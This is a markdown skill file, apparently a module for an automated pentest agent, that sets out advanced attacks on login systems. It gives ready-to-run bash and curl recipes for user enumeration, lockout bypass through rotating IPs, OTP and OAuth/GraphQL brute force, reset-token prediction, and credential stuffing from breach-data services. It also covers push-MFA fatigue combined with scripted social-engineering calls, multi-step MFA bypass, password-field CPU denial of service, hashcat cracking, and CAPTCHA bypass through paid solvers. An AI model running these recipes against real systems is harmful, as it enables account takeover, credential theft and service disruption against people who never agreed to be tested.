---
name: weak-password-detection-advanced-deep
description: Advanced credential-attack primitives — enumeration oracle calibration, lockout-key breaking, OTP brute, reset-token entropy analysis, OAuth2/GraphQL/mobile-API brute surfaces, hash cracking, and CAPTCHA bypass.
sibling: weak_password_detection
load_when: scan_mode == "deep"
---

# Weak Password Detection — Advanced Techniques

Base `weak_password_detection.md` owns the attack-surface framing, the enumeration-oracle checklist, the rate-limit-bypass taxonomy, the IdP-spraying workflows for Entra/Okta/Google Workspace, the OTP + reset-token classes, the WebAuthn/passkey downgrade pattern, and the one-line class-shapes for bcrypt pre-5.0.0 truncation and the Okta Classic bypass. This file owns the expert-tier primitives: statistical enumeration-oracle calibration, lockout-key-break primitives in full P/P/A/C/I shape, OAuth2 ROPC + GraphQL batch + mobile-API brute surfaces, SSO/SAML replay, hash-recovery and cracking workflows, CAPTCHA bypass primitives, and the password-field-as-compute-sink DoS class. CVE-level, vendor-advisory-level metadata, and the NIST SP 800-63B-4 (July 2025) assessment guidance live in `weak_password_detection_novel_deep.md`; this file references by number/advisory with pointers. Password-policy findings should be assessed against SP 800-63B-4 as the current standard (minimum 15 chars, no composition rules, breached-password blocklist mandatory, no forced rotation).

## Statistical Enumeration-Oracle Calibration

**Primitive.** An enumeration oracle (status/length/timing/side-flow) is a reproducible asymmetry in server responses that distinguishes valid-user from invalid-user requests. Advanced calibration treats the oracle as a signal-detection problem: measure the baseline (invalid-user) distribution across all four dimensions, measure a known-valid baseline (your own account), then classify a candidate list by its distance from each distribution. The calibration dimension that most reliably separates in your harness is the one to attack with; often it is *timing* when the application has equalized the visible response shapes.

**Preconditions.** All of: (i) the target has a login/registration/reset endpoint whose response is at least partially server-rendered; (ii) at least one of the four dimensions (status, length, ETag/Last-Modified/other-header, timing) varies between valid and invalid user cases; (iii) the attacker has at least one known-valid identity to establish the positive baseline (own test account, published-user, or a prior-confirmed hit).

**Attack recipe.**

```bash
# Baseline distributions — 50 invalid users + 50 known-valid attempts, same password:
for i in $(seq 1 50); do
  for u in $(shuf -n 1 known-invalid-users.txt); do
    curl -s -o /dev/null -w '%{http_code} %{size_download} %{time_total}\n' \
      -X POST 'https://target/login' -d "username=$u&password=Wrong!"
  done
done > invalid-baseline.csv

for i in $(seq 1 50); do
  curl -s -o /dev/null -w '%{http_code} %{size_download} %{time_total}\n' \
    -X POST 'https://target/login' -d "username=own-test-account&password=Wrong!"
done > valid-baseline.csv

# Statistical separation — t-test on each dimension:
python3 -c '
import csv, statistics
def col(f, i): return [float(r.split()[i]) for r in open(f)]
for name, c in [("status", 0), ("length", 1), ("time", 2)]:
    inv = col("invalid-baseline.csv", c)
    val = col("valid-baseline.csv", c)
    if statistics.stdev(inv) + statistics.stdev(val) > 0:
      sep = abs(statistics.mean(inv) - statistics.mean(val)) / (statistics.stdev(inv) + statistics.stdev(val))
    else: sep = float("inf")
    print(f"{name}: inv={statistics.mean(inv):.3f}+-{statistics.stdev(inv):.3f}  val={statistics.mean(val):.3f}+-{statistics.stdev(val):.3f}  sep={sep:.2f}")
'
# A separation > 2.0 on any dimension is a reliable oracle; classify candidates
# by distance-to-nearest-mean on that dimension.
```

For the timing dimension specifically, repeat each sample 10-20 times to reduce network noise; the valid-user path runs the password-hash function (slow) while the invalid-user path short-circuits (fast). The difference is typically 50-500ms on bcrypt-cost-12 setups and remains detectable even over the public internet with careful aggregation.

**Confirmation signal.** The separation metric on at least one dimension exceeds 2.0 (confident oracle) or 3.0 (strong oracle). A candidate user tested against the calibrated oracle classifies into the valid or invalid cluster with the expected separation. Reproducibility across multiple sampling runs confirms the oracle is a real signal, not a transient effect.

**Impact.** User-enumeration against targets that have equalized visible error messages; preserves the enumeration primitive against defenders who have hardened the obvious indicators but left timing or microstructural differences. Routes to the base's enumeration-oracle checklist for the dimension-choice context and to this file's cloud-IdP enumeration section for the dedicated-IdP-endpoint shortcut.

## Lockout-Key Break — Per-IP, Per-Account, Per-String, Counter-Reset

**Primitive.** A lockout counter keys on a specific feature of the request — IP address, username string, session, or (rarely) user-identity. Breaking the primitive requires identifying which feature the counter keys on and then varying that feature while holding the attack dimension constant. The per-IP break (rotate source IPs), the per-account break (spray across accounts), the per-string break (same account, different string representation), and the counter-reset side channel (reset the counter without resetting the attempt) are the four main categories.

**Preconditions.** For per-IP: an attacker-controlled IP pool (FireProx / API Gateway / proxy pool / Cloudflare-worker rotation). For per-account: a user list and acceptance that spraying slows per-account attempt rate. For per-string: the application's username canonicalization is weaker than its counter's keying (e.g. counter keys on raw string, authentication canonicalizes before lookup). For counter-reset: the application has at least one side-flow (reset email, OTP request, session re-establishment) that touches the same counter.

**Attack recipes (per break).**

```bash
# Per-IP break — FireProx stand-up (AWS API Gateway rotating source IP):
python fire.py --access_key AKIA... --secret_access_key ... --region us-east-1 \
  --command create --url https://target.com
# fire.py prints an API Gateway URL; point ffuf at it:
ffuf -w passwords.txt:PASS -u https://<apigw-id>.execute-api.us-east-1.amazonaws.com/fireprox/login \
  -X POST -d 'username=victim&password=PASS' -fs 123

# Per-account break — spray one password across many accounts (per-account counter unaffected):
ffuf -w users.txt:USER -u https://target/login -X POST -d 'username=USER&password=Autumn2026!' -fs 123

# Per-string break — variants that authenticate the same account but hash to different counter keys:
# Admin vs admin
curl -X POST 'https://target/login' -d 'username=Admin&password=Wrong'
# admin with trailing space
curl -X POST 'https://target/login' --data-urlencode 'username=admin ' --data-urlencode 'password=Wrong'
# admin with unicode-equivalent (CYRILLIC a vs LATIN a)
curl -X POST 'https://target/login' --data-urlencode "username=аdmin" --data-urlencode 'password=Wrong'
# admin with trailing dot
curl -X POST 'https://target/login' -d 'username=admin.&password=Wrong'
# admin with email +tag
curl -X POST 'https://target/login' -d 'username=admin+tag@target.com&password=Wrong'

# Counter-reset side channel — reset request between failed attempts:
for pw in $(cat passwords.txt); do
  curl -s -X POST 'https://target/login' -d "username=victim&password=$pw"
  # Request a password reset to reset the counter (if the app is misconfigured):
  curl -s -X POST 'https://target/password/reset' -d 'email=victim@target.com'
done
```

For the per-string break, the key is to establish that `Admin` and `admin` resolve to the same account by first logging in with `Admin` (if valid credentials are known for one variant) and observing the authenticated session names the same identity; then the counter breaks because each variant has its own key.

**Confirmation signal.** After the break, the attack rate against the target scales linearly with the varied dimension (new IPs continue to accept attempts; new accounts continue to accept the sprayed password; new string variants continue to be accepted). The server returns login-success or specific error status for a successful break; a continuing-429 after the varied dimension exhausts means the real counter keys on a different feature.

**Impact.** Full brute-force or spray-at-scale against lockouts that visibly appeared to be enforced. The break is often the practical pentester finding — the application has lockout, but it's keyed wrong, and the control is bypassable. Routes to the base's rate-limit-bypass checklist for the taxonomy and to `header_injection.md` for the `X-Forwarded-For` / `X-Real-IP` trust-boundary detail.

## OTP Brute-Force Primitive

**Primitive.** One-time-password codes have small keyspaces (4-digit: 10,000 permutations; 6-digit: 1,000,000) that are brute-forceable in minutes to hours if the server does not rate-limit per-code-per-session or if the server rotates the expected code across validation attempts (meaning the attempt counter does not accumulate against a specific code). The server-side counter can be per-session, per-user, per-request, or absent; the attacker's work is identifying which counter is in place and whether it is bypassable.

**Preconditions.** All of: (i) the application sends an OTP to the user (SMS, email, authenticator app); (ii) the OTP has a known length (observable from the user interface); (iii) the OTP is validated via a request endpoint the attacker can repeatedly call for the same session; (iv) the counter has at least one of the identified weaknesses (per-code, per-session, counter-reset, parallel-request).

**Attack recipe.**

```bash
# Baseline: identify the OTP validation endpoint and the attempt-counter behavior:
# 1. Request an OTP (sends to victim):
curl -s -X POST 'https://target/mfa/send' -d 'user=victim'
# 2. Observe the attempt endpoint:
curl -s -X POST 'https://target/mfa/verify' -d 'user=victim&code=000000'
# → response: {"status":"invalid"} with 200
# 3. Fire 10 wrong codes rapidly:
for i in $(seq 1 10); do
  curl -s -X POST 'https://target/mfa/verify' -d "user=victim&code=00000$i" -w '%{http_code}\n' -o /dev/null
done
# → if the response transitions to 429 or "too many attempts", the counter is active.
# → if 10 attempts return the same 200 "invalid", no counter — brute away.

# Brute-force the 6-digit code (1M permutations, parallel-safe if no counter):
seq -f '%06.0f' 0 999999 | parallel -j 20 \
  'curl -s -X POST https://target/mfa/verify -d user=victim\&code={} -w "{} %{http_code}\n" -o /dev/null' | \
  grep -v '401' | grep -v '400'  # filter failed; successes are 200 or 302

# Counter-reset variant — request a new OTP every N attempts to clear the counter:
seq -f '%06.0f' 0 999999 | while read code; do
  curl -s -X POST 'https://target/mfa/verify' -d "user=victim&code=$code"
  attempts=$((attempts+1))
  if [ "$attempts" = "5" ]; then
    curl -s -X POST 'https://target/mfa/resend' -d 'user=victim' >/dev/null
    attempts=0
  fi
done
```

For OTPs delivered via SMS, the delivery-side primitives (SIM swap, SS7 interception, carrier number-porting attacks) are out-of-scope for this file but are the real-world defeat against SMS-OTP; cite the SMS-OTP finding as a weakness class rather than a brute-forceable primitive.

**Confirmation signal.** A specific code triggers a success response (200 OK with session cookie, 302 to the authenticated route, success JSON) distinguishable from the invalid-code responses. The attempt counter never fires during the brute, OR the counter-reset side channel keeps the attempt rate constant. For parallel brute, the server accepts concurrent attempts against the same session without serializing them.

**Impact.** Full MFA bypass against OTP-second-factor configurations. The real-world rate limit on this attack is the OTP's own expiration — a 60-second OTP window on a 1M-permutation space requires ~17,000 attempts per second to cover, which is reachable on an unlocked endpoint. Routes to `authentication_jwt.md § Session Takeover` for the post-MFA session surface.

## Reset-Token Entropy Analysis

**Primitive.** A password-reset flow issues a token sent via email (or SMS). If the token has insufficient entropy (sequential, timestamp-seeded, user-ID-correlated, or short-length), the attacker predicts valid tokens for other users without receiving the mail. Entropy analysis is the primitive: capture several tokens issued to the attacker's own account at known times, build a model of the generator, then predict tokens for other users.

**Preconditions.** All of: (i) the attacker can trigger reset-token issuance against the attacker's own account (self-registration or a known-attacker-account on the target); (ii) the token is observable (delivered to attacker-controlled mailbox); (iii) the token is used as the authentication credential for the reset confirmation (not just a token-plus-password combo); (iv) the reset-confirmation endpoint accepts tokens for any user, not just the one that triggered the issuance.

**Attack recipe.**

```bash
# Capture 20 reset tokens with their issuance times:
for i in $(seq 1 20); do
  issued_at=$(date +%s)
  curl -s -X POST 'https://target/reset' -d 'email=attacker@tld'
  # Fetch the email (attacker's mailbox); parse the token from the message body.
  token=$(curl -s -H "Authorization: Bearer <mailbox-token>" \
    'https://mailbox/api/latest' | jq -r '.body | capture("token=(?<t>[A-Za-z0-9]+)").t')
  echo "$issued_at $token"
  sleep 5
done > tokens.csv

# Entropy analysis:
# 1. Token length — consistent length = fixed generator; short length = low entropy.
# 2. Character set — hex? base64? base32? Does the alphabet suggest a specific generator?
# 3. Pattern analysis:
#    - Sort by issuance time; is each next token > previous? (sequential generator)
#    - Diff pairs of adjacent tokens; is the delta small? (timestamp-based)
#    - XOR adjacent tokens; is the result low-weight? (counter + fixed-prefix generator)
# 4. Known-plaintext attack: if the generator is predictable, generate the next
#    expected token at a known issuance time; confirm by firing a reset for a
#    specific other user at that time and testing the predicted token.
```

For UUID v1-based tokens (timestamp + MAC-address), the MAC prefix is constant across tokens from the same server; the timestamp component is predictable to microsecond resolution. For `rand()` or `time()`-seeded tokens, the seed is often guessable from the server start-time (identifiable via server headers or uptime fingerprint).

**Confirmation signal.** A predicted token (generated from the model, not received via email) is accepted by the reset-confirmation endpoint for a specific other user and succeeds in resetting that user's password. Independent corroboration: the entropy analysis shows a reproducible pattern across the captured tokens.

**Impact.** Full ATO against any user whose token the attacker can predict — the chain is self-triggered reset for the victim + predicted-token submission. The class generalizes beyond reset tokens to session tokens, API keys, OTP codes, and signed-URL expiration tokens that use the same weak generator. Routes to `authentication_jwt.md § Signed-URL Entropy` for the signed-URL variant and to `cryptography.md § PRNG Weakness` (if present) for the entropy-estimation methodology.

## OAuth2 ROPC and GraphQL Batch Brute Surfaces

**Primitive.** OAuth2 Resource Owner Password Credentials (ROPC) grant — `grant_type=password&username=...&password=...` against the OAuth token endpoint — is a direct username/password check that is often less rate-limited than the primary web login because it is intended for legacy mobile apps. GraphQL mutation batching sends multiple login attempts in a single request, often bypassing per-request rate limits because the limit counts requests, not operations.

**Preconditions (ROPC).** All of: (i) the OAuth server supports `grant_type=password` (fingerprint via the `/.well-known/openid-configuration` document's `grant_types_supported`); (ii) the token endpoint is reachable without client-authentication, or the client-ID is public (common for mobile-app clients). **Preconditions (GraphQL batch).** All of: (i) the application exposes GraphQL at a known path (`/graphql`, `/api/graphql`); (ii) the server accepts batched queries (`[{"query":"..."},...]` as POST body); (iii) the login is exposed as a mutation.

**Attack recipes.**

```bash
# OAuth2 ROPC brute — the token endpoint often lacks per-user rate limits:
for pw in $(cat passwords.txt); do
  curl -s -X POST 'https://target/oauth/token' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -d "grant_type=password&client_id=mobile-app&username=victim&password=$pw" | \
    jq -r 'if .access_token then "SUCCESS: " + .access_token else "FAIL" end'
done

# GraphQL batch brute — 100 attempts in one request:
printf '[%s]' "$(for pw in $(head -100 passwords.txt); do
  printf '{"query":"mutation($u:String!,$p:String!){login(user:$u,pass:$p){token}}","variables":{"u":"victim","p":"%s"}}' "$pw"
done | paste -sd ,)" | \
  curl -s -X POST 'https://target/graphql' -H 'Content-Type: application/json' -d @-
# Response is an array; the entry whose data.login.token is non-null is the successful password.

# JSON-batching alternative (same technique, applies to other batching protocols):
# JSON-RPC: {"jsonrpc":"2.0","id":1,"method":"login","params":[...]}
# gRPC batching: single batch RPC with repeated LoginRequest messages
```

**Confirmation signal.** For ROPC: a specific password returns a successful token response (200 with `access_token`, `token_type`, `expires_in`). For GraphQL batch: one entry in the response array has non-null `data.login.token`. For both, the per-user rate limit was not triggered during the brute attempt (otherwise the finding is "the alternate surface is rate-limited, prefer the primary").

**Impact.** Full account takeover via credentials-only login against the alternate surface. The ROPC primitive is particularly useful because the mobile-app client-ID is typically embedded in the mobile app's binary and extractable statically. GraphQL batching is useful because the rate-limit math is at the request layer, not the operation layer — one batched request runs 100 brute attempts at request-rate cost of one. Routes to `api.md` (if present) for the GraphQL-specific exploitation surface.

## Credential-Stuffing Workflow

**Primitive.** Users reuse passwords across services at rates measured in independent studies between 30% and 80%, so a credential list breached from one service is a working-attempt-list against every other service for a portion of users. The credential-stuffing workflow is: curate a target-relevant corpus from public breach data; apply email-derivation rules to convert generic combolists to target-domain-specific lists; feed the derived list through the lowest-friction authentication surface (web, mobile, API, OAuth ROPC, GraphQL); and collect per-attempt success/failure signals to triage valid credentials for post-exploitation. The economics are favorable because the per-attempt cost is near-zero (a POST + response-parse) while the success rate on a well-curated list is typically 0.1-5% against a mainstream consumer-facing target.

**Preconditions.** All of: (i) a credential corpus relevant to the target (breach-data access, scraped combolists, OSINT-derived username+password pairs); (ii) a target authentication surface without perfect rate limiting / IP-rotation defense (per the Lockout-Key Break primitive — if the deployment has solid per-user cross-IP throttling, stuffing degrades to spray cadence); (iii) ideally, no mandatory MFA (if MFA is universal, stuffing produces "valid credential + locked" findings rather than ATO, which is still useful but weaker).

**Attack recipe.**

```bash
# 1. Corpus curation — filter a 10B-row combolist down to target-relevant rows:
# Pre-indexed breach aggregators (e.g. HIBP, dehashed, snusbase) support
# domain-filtered lookups:
curl -s -H "Authorization: <api-key>" \
  "https://api.dehashed.com/search?query=domain:target.com" > target-credentials.json
# Parse email:password pairs:
jq -r '.entries[] | "\(.email):\(.password)"' target-credentials.json > target-stuffs.txt

# 2. Email-derivation enrichment — convert generic username rows to target emails:
# If a leak contains "alice123:Spring2024!" but no email, derive candidates:
# - username@target.com
# - firstname.lastname@target.com (if "alice123" matches a known employee pattern)
# - Variations: first + last initial, first initial + last, etc.
awk -F: '{print $1"@target.com:"$2}' generic-combolist.txt >> target-stuffs.txt

# 3. Stuffing against the lowest-friction surface — mobile API typically has
# the weakest rate limits:
while IFS=: read email pass; do
  resp=$(curl -s -X POST 'https://api.target.com/mobile/v1/login' \
    -H 'Content-Type: application/json' \
    -H 'User-Agent: TargetApp/1.0 (iOS)' \
    -d "{\"email\":\"$email\",\"password\":\"$pass\"}")
  if echo "$resp" | grep -q '"token"'; then
    echo "HIT: $email:$pass -> $(echo $resp | jq -r .token)"
  fi
done < target-stuffs.txt

# 4. Rate-limit evasion — rotate source IPs (FireProx), introduce jitter,
# distribute attempts across multiple source identities (fresh client-cookies,
# fresh device-fingerprints) if the deployment keys on them.

# 5. Post-hit MFA-check — attempt one authenticated API call per hit to
# distinguish "valid credential" from "MFA-blocked":
for hit in $(cat hits.txt); do
  email=$(echo "$hit" | cut -d: -f1)
  pass=$(echo "$hit" | cut -d: -f2)
  # Attempt a session establishment; the response distinguishes:
  curl -s -X POST 'https://target.com/login' -d "email=$email&password=$pass" \
    -o /dev/null -w '%{http_code} %{header_set-cookie}\n'
  # 200 + Set-Cookie: session= → valid, no MFA, pivotable immediately
  # 200 + Set-Cookie: mfa-pending → valid, MFA required (secondary bypass)
  # 403 → valid credential but policy-blocked (role, geo, device)
done
```

For breach-corpus access specifically, the operational constraints are: HIBP's commercial API requires authentication and does not return plaintext passwords; dehashed and snusbase return plaintexts but are paywalled; public dumps (COMB, Collection #1-5, RockYou2021/2024) are the free alternative but require 100-500GB of storage and specialized indexing (BloomFilter, Trie, or ES-based). For a pentest engagement with contractual access to the client's own exposure, HIBP Pwned Passwords API (returning only the hash prefix for anonymity) is sufficient for the "is this password in a breach corpus" check per user.

**Confirmation signal.** A specific `email:password` pair returns a successful authentication response (200 with session cookie, 200 with `token` field, 302 to the authenticated route) that distinguishes it from the invalid-pair baseline. The pair is reproducibly successful across repeat attempts, confirming the credential works rather than being a race-timed success. Follow-up: test the pair's reach — admin APIs, cross-tenant resources, SSO federation — to establish the chain impact.

**Impact.** Scales directly with the breach corpus and the password-reuse rate; a mainstream consumer-facing target typically yields 0.1-5% hit rates on a well-curated corpus, meaning a 100K-row list produces 100-5,000 valid credentials. The chain impact per hit depends on the per-account privilege; the economic class is "cheap signal at scale." Routes to the base's credential-stuffing section for the policy-level framing and to `cloud/*` for IdP-federated stuffing against cloud-connected tenants.

## MFA Fatigue and Notification Abuse

**Primitive.** Push-notification-based MFA (Microsoft Authenticator push, Duo Push, Okta Verify push, SMS prompts) is a user-interactive factor: the server sends a prompt to the user's device, and the user approves or denies. An attacker holding valid credentials but blocked by push-MFA repeats the authentication attempt rapidly, firing push notifications to the victim's device at a rate that produces notification fatigue — the user either taps "Approve" to stop the notifications (fatigue-approval) or taps the wrong button (fat-finger-approval). The 2022–2024 wave of fatigue attacks (Uber, Cisco, Microsoft, several healthcare orgs) demonstrated the primitive is highly reliable against unprepared users, and the defender's response (Microsoft Authenticator number-matching, Duo Verified Push) is still rolling out unevenly as of 2026.

**Preconditions.** All of: (i) valid credentials for a target account (from spray, stuffing, or prior leak); (ii) the account's MFA factor is push-based (number-matching modes have introduced friction but the simple-approve flow is still default in many deployments); (iii) the server allows repeated authentication attempts within a short window without rate-limiting the push dispatch; (iv) the victim is reachable (device online, notifications enabled, in a time zone where notifications arrive during active hours).

**Attack recipe.**

```bash
# Baseline — one authentication attempt triggers one push:
curl -s -X POST 'https://login.microsoftonline.com/common/oauth2/v2.0/token' \
  -d 'grant_type=password&username=victim@target.com&password=KnownPass!&client_id=public-client&scope=openid'
# Response: pending MFA approval; a push lands on victim's Authenticator app.

# Fatigue — fire N attempts in sequence:
for i in $(seq 1 50); do
  curl -s -X POST 'https://login.microsoftonline.com/common/oauth2/v2.0/token' \
    -d 'grant_type=password&username=victim@target.com&password=KnownPass!&client_id=public-client&scope=openid' \
    -o /dev/null
  sleep 10   # match victim's app's notification debounce; too fast is grouped
done
# Expected: the victim's device shows 50 pending prompts; probability of
# accidental approval climbs with each prompt. Published attacks have
# cadence around 1 prompt every 10-30 seconds for 30-60 minutes.

# Social-engineering amplification — pair fatigue with an impersonation call:
# While the pushes are landing, call the victim from a spoofed internal number
# ("Hi, this is IT support, we're testing the MFA system — please approve the
# prompts you're seeing"). Reported in the Uber 2022 incident and others.

# Number-matching bypass — on deployments where number-matching is enforced,
# the attacker needs the number from the login screen. Side-channel the number
# via a parallel social-engineering call ("what number do you see on the
# prompt?") or via screen-share-pretext. The number-matching defense is
# bypassable with social engineering but not with pure automation.
```

For the specific push-dispatch rate limits, M365 enforces a ~10-prompt-per-5-minute cap on push dispatches in current configurations (as of 2026); the fatigue window is therefore narrower than it was in 2022 but still exploitable with cadence tuning. Duo's Verified Push and Okta's "Push with Number Challenge" similarly add friction but are opt-in per-org.

**Confirmation signal.** A single `Approved` response from the authenticator app after the N-th prompt grants the attacker a valid session token; the attacker observes the token in the authentication endpoint's response. The victim's device shows N pending prompts in the push history, with one approval timestamp recorded. For defender-side detection, the signal is "N pushes within a short window followed by an approval" — the attack is noisy in logs but historically ignored by SOC pipelines not tuned for the fatigue pattern.

**Impact.** Full MFA bypass against push-MFA configurations without number-matching, against stress-approvable users (large-scale deployments have at least some fraction who will approve to stop notifications). The chain is credential-stuffing-or-spray → fatigue → ATO; combined with social-engineering amplification, the hit rate climbs significantly. Patched by deploying push-with-number-matching across the org (Microsoft Authenticator rolled this out as a mandatory enforcement starting 2023-05-08 for tenants that enable it); verify number-matching is enforced before concluding the fatigue primitive is closed. Routes to `authentication_jwt.md § Session Takeover` for post-approval session hijack and to `csrf.md § MFA-Bypass CSRF` for the social-engineering-plus-forged-request chain.

## Multi-Step Authentication Bypass

**Primitive.** Multi-step auth flows (password → MFA; username → password → MFA; email → OTP → password) often implement each step as a separate endpoint with its own authorization check. Bypasses include: direct access to later-step endpoints without completing earlier steps; manipulation of step identifiers to skip steps; response-manipulation to force the step-advance logic to accept a failure as a success; and session-fixation between steps where the attacker's session acquires the victim's completed-step state.

**Preconditions.** All of: (i) the application uses multi-step auth; (ii) at least one step endpoint can be invoked without the prior step completing (direct URL access, or step-identifier manipulation); (iii) OR the state-tracking between steps uses a client-side token / cookie value that the attacker can forge, replay, or steal.

**Attack recipes.**

```bash
# Direct step-advance — try invoking the MFA step without completing the password step:
# 1. Baseline: successful password → MFA transition:
curl -c cookies -X POST 'https://target/login' -d 'username=victim&password=correct'
# Response: 200, Set-Cookie: step=mfa, Location: /mfa
curl -b cookies 'https://target/mfa'
# → MFA form rendered.

# 2. Direct MFA access with no password step:
curl -c freshcookie 'https://target/mfa'
# → if 200 with MFA form, the step gate is not enforced; brute MFA without password.
# → if 302 to /login, step gate is enforced.

# Step-identifier manipulation — if the step is tracked in a URL parameter or
# cookie, change it to the final step:
curl -b 'step=mfa' 'https://target/success'
# or
curl -X POST 'https://target/login/step/3' -d 'username=victim'

# Response-manipulation — change the MFA validation response to force advance:
# Intercept the server's response to the MFA submission; if it returns
# {"mfa_passed": false}, change to true before the client processes it. Many
# single-page apps gate step advance on the client-side JSON — a MITM proxy
# flips the field and the app advances.
# (Works only when server trusts the client-side state after the response.)

# Session-fixation — the attacker's session acquires the victim's state:
# 1. Attacker starts auth: curl -c attacker_session 'https://target/login/start'
# 2. Attacker shares the session cookie with victim (via URL parameter in a crafted link).
# 3. Victim completes auth in the attacker's session.
# 4. Attacker's session is now authenticated as victim.
```

**Confirmation signal.** The bypass variant results in a session that holds the authenticated state without the attacker performing the omitted step — a cookie that would normally be set only after MFA now exists without MFA having been triggered. A sibling request to a post-auth endpoint succeeds with the attacker's session.

**Impact.** Full MFA bypass; cross-user auth hijack via session fixation. Routes to `authentication_jwt.md § Session Fixation` for the fixation-specific chain and to the base's rate-limit-bypass for the step-separated-counter primitive.

## Password-Field CPU Denial-of-Service

**Primitive.** The password field is an unauthenticated compute sink when the server hashes the raw input with a slow KDF (bcrypt, scrypt, Argon2, PBKDF2) before length-checking. An attacker who POSTs a multi-hundred-KB password drives per-request CPU cost from microseconds to seconds; a handful of concurrent requests exhaust worker threads. The primitive is cheap-to-send, expensive-to-process asymmetry, which is the classic amplification shape.

**Preconditions.** All of: (i) the login or registration endpoint accepts the password field without length-limiting it in the frontend's parsing (common — the backend hashes it before length-checking); (ii) the server-side hash is a slow KDF (fingerprint via timing: a login with a 32-byte password that takes 200ms is bcrypt-cost-12-ish; 50ms is bcrypt-cost-10); (iii) the request worker pool has fewer threads than the attacker can concurrently open.

**Attack recipe.**

```bash
# Build a long password string:
python3 -c "print('a' * 500000)" > long-password.txt

# Baseline cost of a normal-length password login:
time curl -s -X POST 'https://target/login' -d 'username=anyone&password=Short!' -o /dev/null

# Cost of a 500KB password login:
time curl -s -X POST 'https://target/login' --data-urlencode "username=anyone" --data-urlencode "password@long-password.txt" -o /dev/null

# Scale with concurrency — fire 50 parallel requests:
seq 1 50 | parallel -j 50 \
  curl -s -X POST 'https://target/login' --data-urlencode "username=user{}" --data-urlencode "password@long-password.txt" -o /dev/null
```

The specific cost scales as per-byte bcrypt work: bcrypt processes 72 bytes per round regardless of input length (modern pyca/bcrypt pre-5.0.0 truncated at 72 bytes before hashing, so the DoS primitive is limited to pre-truncation processing; the raw bytes are read into a buffer and copied, which is still work but not amplified by cost-factor rounds). Argon2 and scrypt are more interesting because they hash the full input; a 500KB input to Argon2-cost-16 is seconds of CPU time.

**Confirmation signal.** The server's latency on the long-password request is multiples (10x+) of the baseline; concurrent long-password requests exhaust the worker pool and other users experience timeouts or 503s. Monitoring the server's CPU shows a direct correlation with the brute of long passwords.

**Impact.** Unauthenticated DoS against the login endpoint; chained with password-field DoS against the registration endpoint, the attack scales to any authentication/registration-involving flow. The fix (observable to confirm): enforce a hard max password length (72-128 chars) *before* hashing, or pre-hash with SHA-256 and feed the SHA output into the KDF. Report the primitive when the server lacks the length cap. Routes to the base's bcrypt-truncation section for the 72-byte boundary context.

## Hash Recovery and Cracking Workflow

**Primitive.** Password hashes recovered through info-disc (actuator heapdump, source-code leak, DB dump, LDAP bind-and-read, mem-dump via `pprof`) are offline-attackable. The workflow is: identify the hash algorithm and format; prepare a wordlist tailored to the target; configure hashcat/John with the matching mode; run brute. Modern GPUs crack bcrypt-cost-12 at ~10K hashes/sec, MD5-based legacy hashes at billions/sec, and Argon2 at hundreds/sec.

**Preconditions.** All of: (i) the attacker has recovered at least one hash from the target; (ii) the hash format is identifiable (via `hashid` or manual inspection of the `$<id>$<cost>$<salt>$<hash>` structure); (iii) the attacker has sufficient GPU/CPU budget and a wordlist tailored to the target.

**Attack recipes.**

```bash
# Hash identification:
echo '$2b$12$CwTycUXWue0Thq9StjUM0uJ8/vJRY6PFlvFxoz7JvzLlDE9kFmNx6' | hashid
# → bcrypt, $2b$

# Hashcat invocation per algorithm:
# bcrypt (-m 3200):
hashcat -m 3200 -a 0 -O hashes.txt rockyou.txt
# MD5 crypt (-m 500):
hashcat -m 500 -a 0 -O hashes.txt rockyou.txt
# NTLM (-m 1000) — Windows AD:
hashcat -m 1000 -a 0 -O hashes.txt rockyou.txt
# scrypt (-m 8900):
hashcat -m 8900 -a 0 -O hashes.txt rockyou.txt
# Argon2 — only via john --format=argon2 or Argon2 Hashcat kernel

# Rule-based attack — amplify a wordlist with rules:
hashcat -m 3200 -a 0 -O hashes.txt rockyou.txt -r rules/best64.rule
# best64 applies common mutations (append/prepend numbers, case changes, leet).

# Mask attack — brute specific position-wise character sets:
# Password = <word>+<year>+<special>:
hashcat -m 3200 -a 6 hashes.txt dict/words.txt '?d?d?d?d!'
# Password = Capital + 7-char-lower + digit:
hashcat -m 3200 -a 3 hashes.txt '?u?l?l?l?l?l?l?l?d'

# Target-specific wordlist (CUPP):
cupp -i    # interactive, prompts for target details, generates custom wordlist
```

**Confirmation signal.** Hashcat/John report a crack — `<hash>:<plaintext>` output line. The recovered plaintext successfully authenticates against the live target. Multiple hashes crack to the same password → users are reusing passwords (common finding).

**Impact.** Offline password recovery of every user whose hash was recovered. The impact is bounded by hash algorithm (bcrypt is slow, MD5 is near-instantaneous) and wordlist coverage. Routes to the base's credential-stuffing section for the post-crack reuse testing and to `authentication_jwt.md § Session Token` for the post-login session takeover.

## CAPTCHA Bypass Primitives

**Primitive.** CAPTCHAs are the last-mile defense against automated login attacks. Bypass primitives include: token reuse (submitting the same CAPTCHA token across multiple login attempts); automated solvers (reCAPTCHA v2's audio challenge is speech-to-text-solvable; v3's score threshold is user-agent/behavior-fingerprint-defeatable); third-party solver services (2captcha, death-by-captcha, anti-captcha — commercial, cheap); and bypass through alternate flows (mobile-app endpoint without CAPTCHA; OAuth ROPC without CAPTCHA; API endpoint without CAPTCHA).

**Preconditions.** For token-reuse: the CAPTCHA token is bound to the session, not to a single request. For automated solvers: the CAPTCHA is one of the solvable types (reCAPTCHA v2 image/audio, hCaptcha, basic image CAPTCHAs). For third-party solvers: the attacker has a solver-service API key. For alternate flows: an alternate endpoint without CAPTCHA exists.

**Attack recipes.**

```bash
# Token reuse — capture the CAPTCHA token once, submit many logins with it:
curl -s 'https://target/login' > /tmp/login.html
token=$(grep -oP 'g-recaptcha-response"[^>]*value="[^"]*' /tmp/login.html | sed 's/.*value="//')
# ← if the token is server-side-generated and bound only to session, reuse it.
for pw in $(cat passwords.txt); do
  curl -s -X POST 'https://target/login' \
    -d "username=victim&password=$pw&g-recaptcha-response=$token"
done

# Third-party solver — 2captcha API for reCAPTCHA:
# 1. Submit CAPTCHA to 2captcha:
curl -s "http://2captcha.com/in.php?key=<APIKEY>&method=userrecaptcha&googlekey=<SITEKEY>&pageurl=https://target/login"
# 2. Poll for solution; receive the solved token.
# 3. Submit the login with the solved token.

# Alternate-flow bypass — find the API endpoint without CAPTCHA:
# Fingerprint via the mobile app's binary (Burp intercepts), the OpenAPI spec,
# the GraphQL schema, or the OAuth ROPC endpoint. One of these frequently
# skips the CAPTCHA requirement.
```

